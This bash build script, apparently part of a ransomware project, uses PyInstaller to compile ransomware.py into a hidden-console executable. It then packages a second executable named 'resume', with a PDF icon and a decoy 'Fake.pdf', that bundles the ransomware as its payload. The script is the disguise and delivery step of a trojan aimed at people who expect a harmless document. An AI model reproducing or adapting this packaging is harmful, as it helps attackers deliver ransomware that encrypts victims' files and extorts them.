#!/bin/bash
python -m pip install -r requirements.txt
python -m PyInstaller --onefile --noconsole --icon=ransomware.ico --add-data "hack.jpg;." --name ransomware ./ransomware.py
python -m PyInstaller --onefile --noconsole --icon=pdf.ico --add-data "Fake.pdf;." --add-data "ransomware.exe;." --name resume ./payload.py